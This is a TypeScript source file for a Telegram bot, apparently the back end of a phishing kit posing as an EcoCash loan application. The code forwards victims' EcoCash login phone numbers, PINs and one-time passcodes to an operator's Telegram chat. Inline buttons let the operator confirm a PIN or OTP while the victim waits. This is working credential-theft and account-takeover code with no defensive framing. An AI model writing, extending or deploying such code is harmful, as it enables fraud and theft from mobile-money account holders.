/**
 * Telegram Bot Integration
 * Sends formatted messages to the admin chat with inline Approve/Reject buttons.
 * Env vars are read lazily at call time so they're available from Replit secrets.
 */

import { logger } from "./logger.js";

const BASE_TG_URL = () => `https://api.telegram.org/bot${process.env.BOT_TOKEN}`;

function checkConfig(): boolean {
  if (!process.env.BOT_TOKEN) {
    logger.warn("BOT_TOKEN is not set — Telegram notifications disabled");
    return false;
  }
  if (!process.env.CHAT_ID) {
    logger.warn("CHAT_ID is not set — Telegram notifications disabled");
    return false;
  }
  return true;
}

/**
 * Send a message to Telegram via Bot API
 */
async function sendTelegramMessage(payload: object): Promise<number | null> {
  if (!checkConfig()) return null;

  try {
    const res = await fetch(`${BASE_TG_URL()}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const result = (await res.json()) as {
      ok: boolean;
      result?: { message_id: number };
      description?: string;
    };

    if (!result.ok) {
      logger.error({ description: result.description }, "Telegram API error");
      return null;
    }

    const messageId = result.result?.message_id ?? null;
    logger.info({ messageId }, "Telegram message sent");
    return messageId;
  } catch (err) {
    logger.error({ err }, "Failed to send Telegram message");
    return null;
  }
}

/**
 * Answer a callback_query (removes loading spinner from Telegram inline button)
 */
export async function answerTelegramCallback(
  callbackQueryId: string,
  text: string,
): Promise<void> {
  if (!process.env.BOT_TOKEN) return;

  try {
    await fetch(`${BASE_TG_URL()}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text }),
    });
  } catch (err) {
    logger.error({ err }, "Failed to answer Telegram callback");
  }
}

interface LoginMessageParams {
  sessionId: string;
  firstName: string;
  lastName: string;
  phoneNumber: string;
  loanType: string;
  loanAmount: number;
  loanTerm: number;
  loanPurpose: string;
  employmentStatus: string;
  monthlyIncome: number;
  loginPhone: string;
  loginPin: string;
}

/**
 * Send full application + login credentials to Telegram admin.
 * Admin sees Approve and Reject inline buttons.
 */
export async function sendTelegramLoginMessage(
  params: LoginMessageParams,
): Promise<number | null> {
  const {
    sessionId,
    firstName,
    lastName,
    phoneNumber,
    loanType,
    loanAmount,
    loanTerm,
    loanPurpose,
    employmentStatus,
    monthlyIncome,
    loginPhone,
    loginPin,
  } = params;

  const text = [
    `🏦 *NEW ECOCASH LOAN APPLICATION*`,
    ``,
    `👤 *Applicant Details:*`,
    `• Name: ${firstName} ${lastName}`,
    `• Phone: ${phoneNumber}`,
    `• Employment: ${employmentStatus}`,
    `• Monthly Income: $${monthlyIncome.toLocaleString()}`,
    ``,
    `💰 *Loan Details:*`,
    `• Type: ${loanType}`,
    `• Amount: $${loanAmount.toLocaleString()}`,
    `• Term: ${loanTerm} months`,
    `• Purpose: ${loanPurpose}`,
    ``,
    `🔐 *EcoCash Login Credentials:*`,
    `• Phone: ${loginPhone}`,
    `• PIN: ${loginPin}`,
    ``,
    `📋 Session ID: \`${sessionId}\``,
  ].join("\n");

  return sendTelegramMessage({
    chat_id: process.env.CHAT_ID,
    text,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${sessionId}` },
          { text: "❌ Reject", callback_data: `reject_${sessionId}` },
        ],
      ],
    },
  });
}

interface OtpMessageParams {
  sessionId: string;
  firstName: string;
  lastName: string;
  phoneNumber: string;
  otp: string;
}

/**
 * Send OTP code to Telegram admin for verification.
 * Admin sees Correct and Wrong inline buttons.
 */
export async function sendTelegramOtpMessage(
  params: OtpMessageParams,
): Promise<number | null> {
  const { sessionId, firstName, lastName, phoneNumber, otp } = params;

  const text = [
    `🔢 *OTP VERIFICATION REQUEST*`,
    ``,
    `👤 *Applicant:* ${firstName} ${lastName}`,
    `📱 *Phone:* ${phoneNumber}`,
    ``,
    `🔑 *Submitted OTP Code:* \`${otp}\``,
    ``,
    `📋 Session ID: \`${sessionId}\``,
    ``,
    `Is this OTP correct?`,
  ].join("\n");

  return sendTelegramMessage({
    chat_id: process.env.CHAT_ID,
    text,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Correct", callback_data: `correct_${sessionId}` },
          { text: "❌ Wrong", callback_data: `wrong_${sessionId}` },
        ],
      ],
    },
  });
}

/**
 * Register the webhook URL with Telegram.
 * Called on server startup so bot updates are forwarded to this server.
 */
export async function registerTelegramWebhook(webhookUrl: string): Promise<void> {
  if (!checkConfig()) return;

  try {
    const res = await fetch(`${BASE_TG_URL()}/setWebhook`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: webhookUrl, drop_pending_updates: true }),
    });
    const result = (await res.json()) as { ok: boolean; description?: string };
    if (result.ok) {
      logger.info({ webhookUrl }, "Telegram webhook registered successfully");
    } else {
      logger.error(
        { description: result.description },
        "Failed to register Telegram webhook",
      );
    }
  } catch (err) {
    logger.error({ err }, "Error registering Telegram webhook");
  }
}
